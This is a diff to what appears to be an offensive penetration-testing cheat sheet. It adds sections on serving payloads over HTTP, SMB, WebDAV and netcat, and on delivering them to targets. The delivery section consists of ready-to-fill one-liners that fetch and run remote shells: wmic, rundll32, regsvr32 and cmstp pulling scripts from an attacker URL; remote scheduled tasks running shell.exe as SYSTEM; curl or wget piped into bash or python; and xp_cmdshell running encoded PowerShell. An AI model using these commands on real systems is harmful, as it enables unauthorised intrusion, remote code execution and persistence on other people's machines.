@@ -148,6 +148,60 @@ proxychains nmap -v -sT -p502 -sV -oA <NETWORK>_modbusscan --open <NETWORK/CIDR>
 proxychains nmap -v -sT -p631 -sV -oA <NETWORK>_ippscan --open <NETWORK/CIDR>
 ```
 
+###### SERVING PAYLOADS
+```txt
+# simple http server
+python -m SimpleHTTPServer <LPORT>
+python -c 'import BaseHTTPServer as bhs, SimpleHTTPServer as shs;bhs.HTTPServer(("<LOCALIP>", <LPORT>), shs.SimpleHTTPRequestHandler).serve_forever()'
+
+# simple https server
+openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+python -c 'import BaseHTTPServer as BS, SimpleHTTPServer as SS, ssl;httpd=BS.HTTPServer(("<LOCALIP>", <LPORT>), SS.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True);httpd.serve_forever()'
+
+# smb with smbv2 support
+smbserver.py -ip <LOCALIP> -port <LPORT> -smb2support <SHARENAME> ./
+
+# webdav in place of smb
+wsgidav --auth=anonymous --host=<LOCALIP> --port=<LPORT> --root=./
+
+# bits server 
+python python_bits_http_server.py 
+
+# via tcp/ip
+nc -lvp <LOCALPORT> < payload_to_send.py
+```
+
+###### PAYLOAD DELIVERY
+```txt
+# wmic xsl, local process, remote node process
+wmic.exe process get brief /format:"https://<URL>/shell.xsl"
+wmic.exe process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
+wmic.exe /node:<TARGETIP> process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
+
+# rundll32 jscript, smb, and webdav
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
+rundll32 \\<SMBIP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
+net use p: http://<WEBDAVIP> & rundll32 p:\PowerShdll.dll,main .{iwr -user https://<URL>/shell.ps1}^|iex;
+
+# inf and sct via http
+cmstp.exe /ni /s https://<URL>/shell.inf
+regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll
+
+# schtask and at at 08AM
+schtasks /create /s <TARGETIP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /ru "NT AUTHORITY\SYSTEM" /rp "" /tn
+"<TASKNAME>" /tr \\<SMBIIP>\<SHARENAME>\shell.exe /sc daily /st 08:00
+at \\<TARGETIP> 08:00 /NEXT: \\<SMBIIP>\<SHARENAME>\shell.exe
+
+# linux via http, python, bash
+wget -q -O - http://<IP>/shell.py|python -
+curl -s http://<IP>/shell.py|sudo python -
+curl -sv --insecure https://<IP>/shell.sh|bash -
+
+# mssql xp_cmdshell sp, wmi mof 
+mofcomp.exe -N \\<TARGETIP>\root\subscription .\shell.mof
+xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
+```
+
 ###### BGP HIJACK
 ```txt
 # bgp prefix hijack scenario e.g. preferred 65.x.101.0/25 over /24
